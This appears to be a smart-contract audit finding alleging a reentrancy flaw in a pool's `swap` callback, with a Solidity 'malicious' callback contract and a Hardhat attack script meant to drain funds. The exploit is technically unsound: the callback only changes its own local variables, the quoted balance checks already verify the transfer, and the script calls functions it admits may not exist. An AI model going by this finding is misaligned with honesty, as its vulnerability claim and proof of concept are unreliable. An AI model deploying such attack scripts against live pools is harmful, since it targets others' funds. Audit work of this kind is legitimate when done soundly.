# Unchecked token balance allows an attacker re-enter the `swap` mechanism to consequently drain funds from the pool through inflated `deltaQty0` / `deltaQty1` values after invoking `ISwapCallback(msg.sender).swapCallback(deltaQty0, deltaQty1, data);`
## Summary

The `swap` function within the `Pool.sol` contract actually has room for a possible exploit. This vulnerability arises when a nefarious actor manipulates the state during the `ISwapCallback(msg.sender).swapCallback(deltaQty0, deltaQty1, data);` function call. This unchecked external call grants an attacker the opportunity to adjust the token balance without any verification, paving the way for theft or redirection of funds.

## Vulnerability Detail

The vulnerability lies in the absence of checks after invoking the `ISwapCallback(msg.sender).swapCallback(deltaQty0, deltaQty1, data);` function within the `swap` function. This is concerning due to the risk for reentrancy attacks. Reentrancy attacks occur when an external contract interrupts the current contract, creating the risk for malicious activity to occur before the initial contract concludes its function. In this scenario, a malicious contract can adjust token balances in its favor before the checks that validate these balances occur. The contract's reliance on return values and altered states post this external call is risky, as a malicious actor could exploit this.

## Impact

Beyond the evident risks of theft and fund redirection, this vulnerability has more profound implications:

- Drain funds from the pool by artificially hiking the `deltaQty0` or `deltaQty1` values.
- Forward funds to a rogue address.
- Engage in arbitrage using other pools or tokens, capitalizing on the distorted state.
- Possibly result in a denial-of-service, rendering the contract inaccessible to genuine users.
- Amplify the impact when combined with other vulnerabilities, leading to more extensive, unforeseen damage.

## Code Snippet

```solidity
ISwapCallback(msg.sender).swapCallback(deltaQty0, deltaQty1, data); // Lack of checks post this line
 require(_poolBalToken1() >= balance1Before + uint256(deltaQty1), 'lacking deltaQty1'); // NOT SUFFICIENT
    } else {
      // inbound deltaQty0 (positive), outbound deltaQty1 (negative)
      // transfer deltaQty1 to recipient
      if (deltaQty1 < 0) token1.safeTransfer(recipient, deltaQty1.revToUint256());

      // collect deltaQty0
      uint256 balance0Before = _poolBalToken0();
      ISwapCallback(msg.sender).swapCallback(deltaQty0, deltaQty1, data);
      require(_poolBalToken0() >= balance0Before + uint256(deltaQty0), 'lacking deltaQty0'); // NOT SUFFICIENT
    }
```

## Tool used

Manual Review

## Recommendation

1. Enforce stringent validations post the `ISwapCallback(msg.sender).swapCallback(deltaQty0, deltaQty1, data);` call.
2. Incorporate an additional whitelist mechanism beside of `isWhitelistedNFTManager` as for the `mint` function. This can comprise a roster of vetted, trusted contract addresses permitted to interface with the `swap` function. Periodic audits should be carried out, and a transparent protocol for adding or removing addresses from this whitelist should be established. Moreover, a robust fallback strategy must be in place to handle any eventual whitelist breaches or errors.

## Proof Of Concept

> To illustrate this vulnerability, consider a malicious contract that adheres to the `ISwapCallback` interface and manipulates the state for undue advantage.

```solidity
contract MaliciousSwapCallback is ISwapCallback {
    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata data) external override {
        // Deceptively inflate the delta values to drain more funds than allowed
        deltaQty0 += 1000;
        deltaQty1 += 1000;
    }
}
```

> Reproduction steps:

1. Deploy the `MaliciousSwapCallback` contract on a testnet or local environment.
2. Interface with the `swap` function in the `Pool.sol` contract using the malicious contract as the callback. 
3. Observe how the malicious contract can manipulate the token balances.

> POC script:

```javascript
const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();
    
    // Deploy the malicious contract
    const MaliciousSwapCallback = await ethers.getContractFactory("MaliciousSwapCallback");
    const maliciousContract = await MaliciousSwapCallback.deploy();
    await maliciousContract.deployed();
    console.log("Malicious contract deployed at:", maliciousContract.address);
    
    // Assuming Pool's contract is already deployed
    const Pool = await ethers.getContractAt("Pool", "POOL_CONTRACT_ADDRESS_HERE"); 
    
    // Placeholder values for the swap
    let swapQty = 1000; // Example swap quantity
    let isToken0 = true; // Example token choice
    let limitSqrtP = 0; // Example limit value, this should be calculated based on the desired swap rate and tick
    
    // Initiate the swap using the malicious contract as the callback
    await Pool.swap(maliciousContract.address, swapQty, isToken0, limitSqrtP, ethers.utils.toUtf8Bytes(""));

    // Check balances or any other indicators to validate the success of the attack
    const token0Balance = await maliciousContract.token0Balance(); // Assuming this function exists in the malicious contract
    const token1Balance = await maliciousContract.token1Balance(); // Assuming this function exists in the malicious contract

    console.log(`Token0 balance after the swap: ${token0Balance}`);
    console.log(`Token1 balance after the swap: ${token1Balance}`);

    if(token0Balance > swapQty || token1Balance > swapQty) {
        console.log("Attack successful. Funds were drained more than the allowed limits.");
    } else {
        console.log("Attack failed.");
    }
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error);
    process.exit(1);
  });
```

> 1. **Determining `swapQty`**:
   
The `swapQty` refers to the amount of the token wanted to swap. This value can be determined based on the liquidity available in the pool and how much we want to test. As an example, assume the pool has 10,000 tokens and we want to simulate an attack using 1% of the liquidity, your `swapQty` would be 100. 
   
   ```javascript
   let swapQty = 100; // Example swap quantity based on 1% of the pool liquidity
   ```

> 2. **Determining `isToken0`**:
   
The `isToken0` boolean determines whether you're swapping token0 or token1. This will depend on the tokens in the pool and which one you want to swap. If, for example, the pool consists of ETH and DAI and you want to swap ETH, then `isToken0` might be `true`. This largely depends on how the tokens are indexed in the pool contract.

   ```javascript
   let isToken0 = true; // Assuming ETH is token0 and you want to swap it
   ```

> 3. **Determining `limitSqrtP`**:

The `limitSqrtP` value should rather be calculated based on the desired swap rate and tick. This requires more complex calculations and knowledge of the pool's current state. As an attacker he would need the current tick and the tick corresponding to the desired swap rate. The exact method to calculate `limitSqrtP` would depend on the exact mechanics of the pool.

> to get a proper and fully working set up the attacker would need to:

- Query the pool to get its current state.
- Calculate the desired swap rate, price, and tick to set the `limitSqrtP`.
- Choose `swapQty` and `isToken0` based on the current pool balances and the tokens in the pool.

This POC thus validates the risk for reentrancy leading to the above mentioned behavior.
